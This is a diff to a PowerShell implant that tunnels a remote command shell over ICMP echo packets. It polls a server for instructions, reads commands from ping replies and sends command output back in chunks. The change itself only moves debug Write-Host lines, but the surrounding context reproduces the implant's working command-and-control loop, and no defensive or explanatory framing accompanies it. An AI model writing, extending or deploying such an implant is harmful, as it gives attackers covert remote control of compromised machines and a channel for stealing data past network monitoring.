@@ -26,7 +26,6 @@ $PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
 $PingOptions.DontFragment = $true;
 
 Function Send-ICMPMessage([ImplantMessageType]$MessageType, [Byte[]]$Data = @()) {
-	Write-Host "Sending" $MessageType "message."
 	$MessageBytes = @($MessageType) + $Data;
 	$Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions);
 	return $Reply;
@@ -42,7 +41,6 @@ $CommandResult = "";
 $CommandIndex = 0;
 
 while ($True) {
-	Write-Host "State:" $State;
 	switch ($State) {
 		WaitingForInstruction {
 			$Reply = Send-ICMPMessage -MessageType NeedsInstruction;
@@ -55,6 +53,7 @@ while ($True) {
 						$PromptBytes = [Text.Encoding]::UTF8.GetBytes($Prompt);
 						Send-ICMPMessage -MessageType Prompt -Data $PromptBytes;
 						$State = [ImplantState]::WaitingForInstruction;
+						Write-Host "State:" $State;
 					}
 					IssuingCommand {
 						$Command = [Text.Encoding]::UTF8.GetString($Reply.Buffer[1..($Reply.Buffer.Count - 1)]);
@@ -66,6 +65,7 @@ while ($True) {
 						}
 						$CommandIndex = 0;
 						$State = [ImplantState]::SendingCommandResult;
+						Write-Host "State:" $State;
 					}
 					Stop {
 						return;
@@ -82,6 +82,7 @@ while ($True) {
 			if ($CommandIndex -ge $CommandResultBytes.Count) {
 				Send-ICMPMessage -MessageType CommandResultEnd | Out-Null;
 				$State = [ImplantState]::WaitingForInstruction;
+				Write-Host "State:" $State;
 			}
 		}
 	}
